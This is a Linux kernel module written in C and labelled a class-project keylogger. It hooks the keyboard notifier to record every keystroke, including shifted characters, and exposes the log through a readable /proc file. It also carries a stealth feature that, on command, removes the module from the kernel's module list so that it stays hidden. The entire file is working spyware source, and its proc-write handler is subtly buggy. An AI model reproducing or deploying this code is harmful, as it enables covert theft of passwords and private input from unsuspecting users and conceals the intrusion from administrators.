#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alireza Chegini, nimaarek@hotmail.com");
MODULE_DESCRIPTION("Simple Keylogger for class project - laitec.ir");

#define DeviceName "AKeylog"
#define KEYLOGGER_LOG_SIZE 2048

static struct semaphore Mysemaphore;
static struct proc_dir_entry* our_proc_file;
static struct list_head *module_lst = NULL;

static int keylogger_log_len;
static int isShiftKey = 0;
static int module_hidden;
static char keylogger_log[KEYLOGGER_LOG_SIZE];
static char invalue;

static const char* MyKeys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE", "TAB",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "SPACE", "SPACE", "ENTER", "CTRL", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
                        "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
                        "RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
                        "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "PAUSE"
                    };

static const char* MyKeysWithShiftKey[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "BACKSPACE", "TAB",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "SHIFT", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "SHIFT", "\0", "\0", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7",
                        "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "HOME", "UP", "PGUP", "-", "LEFT", "5",
                        "RTARROW", "+", "END", "DOWN", "PGDN", "INS", "DELETE", "\0", "\0", "\0", "F11", "F12",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "ENTER", "CTRL", "/", "PRTSCR", "ALT", "\0", "HOME",
                        "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT", "DEL", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "PAUSE"
                    };

static void hide_module(void){
	if(module_hidden)
		return;
	module_lst = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden=1;
}

static void show_module(void){
	if(!module_hidden)
		return;
	list_add(&THIS_MODULE->list,module_lst);
	module_hidden=0;
}

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
    struct keyboard_notifier_param *param = _param;
    char buf[128];
	int len;

    if ( code == KBD_KEYCODE )
    {
        if( param->value==42 || param->value==54 )
        {
            down(&Mysemaphore);
            if( param->down )
                isShiftKey = 1;
            else
                isShiftKey = 0;
            up(&Mysemaphore);
            return NOTIFY_OK;
        }

        if( param->down ){
            down(&Mysemaphore);
            if( isShiftKey == 0 )
                sprintf(buf, "%s\n", MyKeys[param->value]);
			else
                sprintf(buf, "%s\n", MyKeysWithShiftKey[param->value]);

            len = strlen(buf);
			if(len + keylogger_log_len > KEYLOGGER_LOG_SIZE){
				memset(keylogger_log,0,  KEYLOGGER_LOG_SIZE);
				keylogger_log_len=0;
			}
			strcat(keylogger_log, buf);
			keylogger_log_len+=len; 
            up(&Mysemaphore);
        
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb ={
    .notifier_call = keylogger_notify
};

int procfs_open(struct inode *inode, struct file *file){
	try_module_get(THIS_MODULE);
	return 0;
}

static ssize_t procfs_read(struct file *filp, char *buffer, size_t length, loff_t * offset){
	static int ret = 0;
	if (ret)
		ret = 0;
	else {
		if ( copy_to_user(buffer, keylogger_log, keylogger_log_len) )
			return -EFAULT;

		printk(KERN_INFO "AKeylog: Read %lu bytes\n", keylogger_log_len);
		ret = keylogger_log_len;
	}
	return ret;
}

static ssize_t procfs_write(struct file *file, const char *buffer, size_t length, loff_t * off){

	copy_from_user(invalue, buffer, length);

	if(length > 2 ){
		printk(KERN_ALERT "AKeylog: Enter valid value!!\n");
		return 0;
	}

	if(invalue ==  '0'){
		hide_module();
	}

	if(invalue == '1'){
		show_module();
	}
	return length;
}

int procfs_close(struct inode *inode, struct file *file){
	module_put(THIS_MODULE);
	return 0;
}

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = procfs_read,
	.write = procfs_write,
	.open = procfs_open,
	.release = procfs_close,
};

static int __init AKeylog_init(void){
	
	our_proc_file = proc_create(DeviceName, 0644 , NULL, &fops);
	if(!our_proc_file){
		printk(KERN_ALERT "AKeylog: Registration Failure.\n");
		return -ENOMEM;
	}
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is Registered, have fun\n");
    memset(keylogger_log,0,KEYLOGGER_LOG_SIZE);
	keylogger_log_len=0;
    sema_init(&Mysemaphore, 1);
    return 0;
}

static void __exit AKeylog_exit(void){
    unregister_keyboard_notifier(&keylogger_nb);
    remove_proc_entry(DeviceName, NULL);
    printk(KERN_ALERT "AKeylog: Kernel-Based Keylogger is UnRegistered, GoodBye\n");
}

module_init(AKeylog_init);
module_exit(AKeylog_exit);